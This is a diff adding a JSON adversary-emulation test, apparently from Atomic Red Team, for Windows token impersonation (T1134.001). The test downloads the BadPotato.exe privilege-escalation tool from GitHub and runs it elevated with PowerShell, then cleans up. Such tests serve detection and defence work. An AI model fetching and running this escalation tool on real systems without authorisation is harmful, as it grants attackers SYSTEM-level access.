@@ -1,0 +1,33 @@
+{
+    "name": "Bad Potato",
+    "description": "https://github.com/BeichenDream/BadPotato Privilege escalation using named pipe connections",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n",
+        "cleanup_command": "taskkill /f /im notepad.exe\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1134.001",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Token Impersonation/Theft",
+    "source": "ART",
+    "uuid": "9c6d799b-c111-4749-a42f-ec2f8cb51448",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "BadPotato.exe must exist in the temp directory\n",
+            "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\" \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
